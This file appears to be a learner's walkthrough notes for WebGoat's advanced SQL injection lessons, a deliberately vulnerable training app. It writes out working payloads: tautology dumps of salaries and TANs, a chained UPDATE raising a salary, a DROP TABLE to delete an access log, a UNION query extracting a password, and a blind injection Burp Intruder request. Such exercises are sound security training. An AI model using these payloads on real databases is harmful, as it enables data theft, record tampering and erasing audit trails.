@@ -1,0 +1,216 @@
+https://learn.thehackerlab.co/walkthroughs/webgoat-8/injection-flaws-sql-injection-advanced/
+
+
+TRY SQL INJECTION (9)
+The query in the code builds a dynamic query as seen in the previous example. 
+The query is build by concatenating strings making it susceptible to String SQL injection:
+SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "';
+Your query was: SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
+Explanation: This injection works, because or '1' = '1' always evaluates to true 
+(The string ending literal for '1 is closed by the query itself, so you should not inject it). 
+So the injected query basically looks like this: SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or TRUE, 
+which will always evaluate to true, no matter what came before it
+
+
+TRY IT! NUMMERIC SQL INJECTION (10)
+The query in the code builds a dynamic query as seen in the previous example. The query in the code builds a 
+dynamic query by concatenating a number making it susceptible to Numeric SQL injection:
+
+"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
+
+Using the two Input Fields below, try to retrieve all the data from the users table.
+Warning: Only one of these fields is susceptible to SQL Injection. You need to find out which, to successfully retrieve all the data.
+
+SOLUTION
+Your query was: SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
+
+
+
+IT IS YOUR TURN!
+You are an employee named John Smith working for a big company. The company has an internal system that allows all 
+employees to see their own internal data - like the department they work in and their salary
+The system requires the employees to use a unique authentication TAN to view their data.
+Your current TAN is 3SL99A.
+
+Since you always have the urge to be the most earning employee, you want to exploit the system and instead of viewing your 
+own internal data, _ you want to take a look at the data of all your colleagues_ to check their current salaries.
+
+se the form below and try to retrieve all employee data from the employees table. You should not need to know any specific names or 
+TANs to get the information you need.
+You already found out that the query performing your request looks like this:
+
+"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
+
+SELECT * FROM employees WHERE last_name = 'eddie' ' AND auth_tan = ''123' or '1' = '1 ';
+
+USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN
+32147	Paulina		Travers		Accounting	46000	P45JSI
+34477	Abraham 	Holman		Development	50000	UU2ALK
+37648	John		Smith		Marketing	64350	3SL99A
+89762	Tobi		Barnett		Development	77000	TA9LL1
+96134	Bob		Franco		Marketing	83700	LO9S2V
+
+Brakdown the query
+SELECT * FROM employees --> All records from employees
+WHERE last_name = 'anonymous' The first clause in WHERE means we only want the last_name value 'anonymous'
+AND auth_tan = '1234' OR '1' = '1 We only want the rows with auth_tan '123' or if '1'='1'
+In this statement '1' always equals '1' for every row.
+Result: the database gives us al the data for all rows and not just the one row that matches our spicified user.
+
+
+
+What is SQL query chaining?
+Query chaining is exactly what it sounds like. When query chaining, you try to append one or more queries to the end of the actual query. 
+You can do this by using the ; metacharacter which marks the end of a query and that way allows to start another one right after it within 
+the same line.
+
+IT IS YOUR TURN
+You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.
+Better go and change your own salary so you are earning the most!
+
+Remember: Your name is John Smith and your current TAN is 3SL99A.
+
+blabla
+123'; UPDATE employees SET salary = 200000 WHERE auth_tan = '3SL99A
+
+USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN
+37648	John		Smith		Marketing	200000	3SL99A
+96134	Bob		Franco		Marketing	83700	LO9S2V
+89762	Tobi		Barnett		Development	77000	TA9LL1
+34477	Abraham 	Holman		Development	50000	UU2ALK
+32147	Paulina		Travers		Accounting	46000	P45JSI
+
+
+
+COMPROMISING AVAILABILITY (13)
+fter successfully compromising confidentiality and integrity in the previous lessons, we now are going to compromise the third element of the 
+CIA triad: availability.
+
+The are many different ways to violate availability. If an account is deleted or the password gets changed, the actual owner cannot access 
+it anymore. Attackers could also try to delete parts of the database making it useless or even dropping the whole database. 
+Another way to compromise availability would be to per example revoke access-rights from admins or any other users, so that nobody gets 
+access to (specific parts of) the database.
+
+
+It is your turn!
+Now you are the top earner in your company. But do you see that? There seems to be a access_log table, where all your actions have been logged to!
+Better go and delete it completely before anyone notices.
+
+%blah'; DROP table access_log; --%
+
+Success! You successfully deleted the access_log table and that way compromised the availability of the data
+
+
+ADVANCCED(3) --> TRY IT! PULLING DATA FROM OTHER TABLES
+
+The input field below is used to get data from a user by their last name.
+The table is called 'user_data':
+
+CREATE TABLE user_data (userid int not null, 		(Count the field!!!!!)
+                        first_name varchar(20),
+                        last_name varchar(20),
+                        cc_number varchar(30),
+                        cc_type varchar(10),
+                        cookie varchar(20),
+                        login_count int);
+
+
+Through experimentation you found that this field is susceptible to SQL injection. Now you want to use that knowledge to get the contents of 
+another table. The table you want to pull data from is:
+CREATE TABLE user_system_data (userid int not null primary key,
+			                 user_name varchar(12),
+			                  password varchar(10),
+			                    cookie varchar(30)
+);
+
+6.a) Retrieve all data from the table
+6.b) When you have figured it out…​. What is Dave’s password?
+
+Note: There are multiple ways to solve this Assignment. One is by using a UNION, the other by appending a new SQl statement. 
+Maybe you can find both of them
+
+
+Smith' union all select userid, user_name, user_name, user_name, user_name, password, userid from user_system_data where user_name='dave';-- 
+
+You have succeeded:
+
+USERID, FIRST_NAME, 	LAST_NAME, 	CC_NUMBER, 	CC_TYPE, 	COOKIE, 	LOGIN_COUNT,
+102, 	John, 		Smith, 		2435600002222, 	MC, 		, 		0,
+102, 	John, 		Smith, 		4352209902222, 	AMEX, 		, 		0,
+105, 	dave, 		dave, 		dave, 		dave, 		passW0rD, 	105,
+
+Well done! Can you also figure out a solution, by appending a new Sql Statement?
+Your query was: SELECT * FROM user_data WHERE last_name = 'Smith' union all select userid, user_name, user_name, user_name, user_name, password, userid from user_system_data where user_name='dave';-- '
+
+
+
+ADVANCED (6) 
+We now explained the basic steps involved in an SQL injection. In this assignment you will need to combine all the things we explained in the SQL lessons.
+Goal: Can you login as Tom?
+Have fun!
+
+User TestKees created, please proceed to the login page.
+Create a user (TestKees, testkees@test.nl, post)
+
+Create a new user with TestKees' AND '1'='1 --> User already created.
+Next a new user User TestKees' AND '1'='2 created, please proceed to the login page.
+
+For example, let's ask if the first character of Tom's password is the character "a". Submit this as the username
+tom' AND substring(password,1,1)='a
+tom' AND substring(password,1,1)='b
+tom' AND substring(password,1,1)='c  --> User tom' AND substring(password,1,1)='c created, please proceed to the login page.
+tom' AND substring(password,1,1)='d
+tom' AND substring(password,1,1)='t  --> User {0} already exists please try to register with a different username.
+
+Use Wireshark for the correct values 
+
+BURP Suite Intruder --> Positions
+
+PUT /WebGoat/SqlInjectionAdvanced/challenge HTTP/1.1
+Host: 127.0.0.1:8080
+Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:8080/WebGoat/start.mvc
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Lenght: 139
+Connection: keep-allive
+Cookie: JSESSIONID=0jiRa5gqgyTKHve65GwjKCcZJdHQhCpfp75tUMrf; WEBWOLFSESSION=611C1873BBEA719B5DC05244D825D0C9
+
+username_reg=tom'+and+substring(password,1,1)=§pass_char§&email_reg=TestKees@test.nl$password_reg=password&confirm_password_reg=password
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
